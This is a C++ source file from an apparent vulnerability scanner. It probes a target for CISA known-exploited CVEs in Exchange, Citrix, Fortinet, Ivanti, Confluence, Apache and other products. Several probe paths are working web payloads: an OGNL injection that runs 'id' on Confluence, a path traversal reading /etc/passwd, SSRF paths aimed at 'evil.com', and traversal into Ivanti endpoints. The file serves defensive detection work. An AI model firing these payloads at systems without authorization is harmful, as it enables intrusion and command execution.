/// @file scanners/kev_cves.cpp
/// @brief CISA KEV catalog scanner: probes for known exploited vulnerabilities
///        via path-based fingerprinting, version matching, and active checks.
#include "scanner_base.hpp"

namespace apex {
namespace {

struct KevEntry {
  const char *cve;
  const char *product;
  const char *severity;
  const char *desc;
  const char *probe_path;    // HTTP path to probe (nullptr = skip)
  const char *match;         // String to match in response body
  int expect_status;         // 0 = any 2xx
};

// clang-format off
const KevEntry kev_db[] = {
    // === Microsoft Exchange (ProxyLogon / ProxyShell / ProxyNotShell) ===
    {"CVE-2021-26855", "Exchange", "critical",
     "ProxyLogon — SSRF to RCE on Exchange",
     "/owa/auth/x.js", "NegotiateSecurityContext", 0},
    {"CVE-2021-34473", "Exchange", "critical",
     "ProxyShell — pre-auth path confusion RCE",
     "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
     nullptr, 200},
    {"CVE-2022-41040", "Exchange", "critical",
     "ProxyNotShell — SSRF via autodiscover",
     "/autodiscover/autodiscover.json?@evil.com/PowerShell",
     nullptr, 302},

    // === Citrix ===
    {"CVE-2019-19781", "Citrix ADC", "critical",
     "Citrix ADC/Gateway RCE — directory traversal",
     "/vpn/../vpns/cfg/smb.conf", "[global]", 0},
    {"CVE-2023-3519", "Citrix NetScaler", "critical",
     "Citrix NetScaler RCE — unauthenticated",
     "/vpn/index.html", "NetScaler", 0},
    {"CVE-2023-4966", "Citrix NetScaler", "critical",
     "CitrixBleed — session token leak",
     "/oauth/idp/.well-known/openid-configuration", "issuer", 0},

    // === Cisco ===
    {"CVE-2023-20198", "Cisco IOS XE", "critical",
     "Cisco IOS XE Web UI auth bypass — implant deployment",
     "/webui/logoutconfirm.html?logon_hash=1", nullptr, 200},
    {"CVE-2018-0171", "Cisco Smart Install", "critical",
     "Cisco Smart Install RCE",
     "/vines/0/still", nullptr, 200},

    // === VMware ===
    {"CVE-2021-21972", "VMware vCenter", "critical",
     "vCenter Server RCE via vROPS plugin",
     "/ui/vropspluginui/rest/services/uploadova", nullptr, 405},
    {"CVE-2022-22954", "VMware Workspace ONE", "critical",
     "Workspace ONE Access SSTI RCE",
     "/catalog-portal/ui/oauth/verify?error=&deviceUdid=${7*7}",
     "49", 0},
    {"CVE-2023-34048", "VMware vCenter", "critical",
     "vCenter out-of-bounds write RCE",
     "/sdk", "vCenter", 0},

    // === Fortinet ===
    {"CVE-2024-47575", "FortiManager", "critical",
     "FortiManager — FortiJump unauthenticated RCE",
     "/p/app/", "FortiManager", 0},
    {"CVE-2023-27997", "FortiGate", "critical",
     "FortiOS SSL-VPN heap overflow RCE",
     "/remote/logincheck", "redir=", 0},
    {"CVE-2022-40684", "FortiOS", "critical",
     "FortiOS auth bypass via crafted HTTP request",
     "/api/v2/cmdb/system/admin", nullptr, 401},

    // === Palo Alto ===
    {"CVE-2024-3400", "PAN-OS", "critical",
     "PAN-OS GlobalProtect command injection",
     "/global-protect/portal/css/login.css", nullptr, 200},

    // === Ivanti / Pulse Secure ===
    {"CVE-2024-21887", "Ivanti Connect Secure", "critical",
     "Ivanti Connect Secure command injection",
     "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
     nullptr, 200},
    {"CVE-2023-46805", "Ivanti Connect Secure", "critical",
     "Ivanti Connect Secure auth bypass",
     "/api/v1/totp/user-backup-code/../../system/system-information",
     "version", 0},

    // === Apache ecosystem ===
    {"CVE-2017-5638", "Apache Struts", "critical",
     "Apache Struts2 RCE via Content-Type OGNL injection",
     "/struts/webconsole.html", "Struts", 0},
    {"CVE-2023-46604", "Apache ActiveMQ", "critical",
     "ActiveMQ ClassInfo RCE",
     "/admin/", "ActiveMQ", 0},
    {"CVE-2020-1938", "Apache Tomcat", "critical",
     "Ghostcat — AJP connector file read/RCE",
     "/", "Apache Tomcat", 0},
    {"CVE-2021-41773", "Apache HTTP", "critical",
     "Apache 2.4.49 path traversal RCE",
     "/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd", "root:", 0},

    // === Atlassian / DevOps ===
    {"CVE-2023-22515", "Confluence", "critical",
     "Confluence broken access control — admin creation",
     "/server-info.action", "Confluence", 0},
    {"CVE-2022-26134", "Confluence", "critical",
     "Confluence OGNL injection RCE",
     "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
     nullptr, 302},
    {"CVE-2024-23897", "Jenkins", "critical",
     "Jenkins CLI arbitrary file read",
     "/cli?remoting=false", "Jenkins", 0},
    {"CVE-2024-27198", "TeamCity", "critical",
     "JetBrains TeamCity auth bypass RCE",
     "/app/rest/users;.jsp", "username", 0},
    {"CVE-2023-42793", "TeamCity", "critical",
     "JetBrains TeamCity auth bypass",
     "/app/rest/debug/processes?exePath=cmd", nullptr, 400},

    // === Linux / Containers ===
    {"CVE-2022-0847", "Linux", "high",
     "Dirty Pipe — local privilege escalation",
     nullptr, nullptr, 0},
    {"CVE-2021-3493", "Linux", "high",
     "OverlayFS privilege escalation",
     nullptr, nullptr, 0},
    {"CVE-2024-21626", "runc", "critical",
     "runc container escape via /proc/self/fd",
     nullptr, nullptr, 0},
    {"CVE-2024-3094", "XZ Utils", "critical",
     "XZ backdoor — SSH auth bypass",
     nullptr, nullptr, 0},

    // === Webmail ===
    {"CVE-2023-5631", "Roundcube", "high",
     "Roundcube XSS to RCE",
     "/program/resources/tinymce/", "tinymce", 0},
    {"CVE-2024-49112", "Windows LDAP", "critical",
     "Windows LDAP RCE — LDAP Nightmare",
     nullptr, nullptr, 0},

    // === Misc internet-facing ===
    {"CVE-2024-30051", "Windows DWM", "high",
     "Windows DWM privilege escalation (in-the-wild)",
     nullptr, nullptr, 0},
    {"CVE-2023-23397", "Outlook", "critical",
     "Outlook NTLM credential theft via calendar invite",
     nullptr, nullptr, 0},
    {"CVE-2022-30190", "MSDT", "high",
     "Follina — MSDT RCE via Office documents",
     nullptr, nullptr, 0},
    {"CVE-2020-1472", "Netlogon", "critical",
     "Zerologon — domain admin via Netlogon",
     nullptr, nullptr, 0},
    {"CVE-2021-34527", "Print Spooler", "critical",
     "PrintNightmare — RCE/LPE via print spooler",
     nullptr, nullptr, 0},
    {"CVE-2017-0144", "SMB", "critical",
     "EternalBlue — WannaCry SMBv1 RCE",
     nullptr, nullptr, 0},

    // === Monitoring / Infra ===
    {"CVE-2025-24016", "Wazuh", "critical",
     "Wazuh Manager RCE — unsafe deserialization",
     "/api/v1/agents", "Wazuh", 0},
    {"CVE-2024-4577", "PHP-CGI", "critical",
     "PHP-CGI argument injection RCE",
     "/index.php?%ADd+allow_url_include%3D1", nullptr, 200},

    // === SolarWinds / HPE ===
    {"CVE-2025-37164", "HPE OneView", "critical",
     "HPE OneView RCE — unauthenticated",
     "/rest/login-sessions", "HPE OneView", 0},
};
// clang-format on

constexpr size_t KEV_DB_SIZE = sizeof(kev_db) / sizeof(kev_db[0]);

/// Probe targets for KEV CVEs that have HTTP-based detection paths.
std::vector<Finding> scan_kev_probes(const Config &, HttpClient &http,
                                     const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  for (size_t i = 0; i < KEV_DB_SIZE; ++i) {
    const auto &e = kev_db[i];
    if (!e.probe_path) continue;

    auto resp = http.get(base + e.probe_path);

    bool hit = false;
    if (e.expect_status > 0) {
      hit = (resp.status_code == e.expect_status);
    } else {
      hit = (resp.status_code >= 200 && resp.status_code < 400);
    }

    if (hit && e.match) {
      hit = (resp.body.find(e.match) != std::string::npos);
    }

    if (hit) {
      findings.push_back(
          {std::string(e.cve) + " (" + e.product + ")", e.severity, base,
           std::string(e.desc) + " — probe: " + e.probe_path, "", "", ""});
    }
  }
  return findings;
}

/// Match detected server banners/headers against KEV entries.
std::vector<Finding> scan_kev_banner_match(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  auto resp = http.get(crawl.urls[0]);
  std::string combined;
  for (const auto &[k, v] : resp.headers)
    combined += k + ": " + v + "\n";
  combined += resp.body.substr(0, 2000);

  for (size_t i = 0; i < KEV_DB_SIZE; ++i) {
    const auto &e = kev_db[i];
    if (!e.match || e.probe_path) continue; // skip probe-based and no-match
    if (combined.find(e.match) != std::string::npos) {
      findings.push_back(
          {std::string(e.cve) + " (" + e.product + ")", e.severity,
           crawl.urls[0],
           std::string(e.desc) + " — product fingerprint detected", "", "",
           ""});
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_kev_scanners() {
  return {
      {"KEV CVE Probes", scan_kev_probes},
      {"KEV Banner Match", scan_kev_banner_match},
  };
}

} // namespace apex
